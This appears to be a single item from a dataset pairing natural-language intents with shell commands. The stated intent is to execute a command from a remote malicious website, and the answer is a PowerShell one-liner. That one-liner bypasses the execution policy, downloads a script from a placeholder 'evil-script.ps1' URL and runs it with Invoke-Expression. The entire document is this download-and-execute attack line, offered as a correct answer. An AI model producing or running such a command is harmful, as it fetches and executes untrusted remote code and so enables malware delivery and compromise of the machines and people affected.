# Natural language intent:
# Execute a command from a remote malicious website using PowerShell

powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example-website.com/evil-script.ps1')"
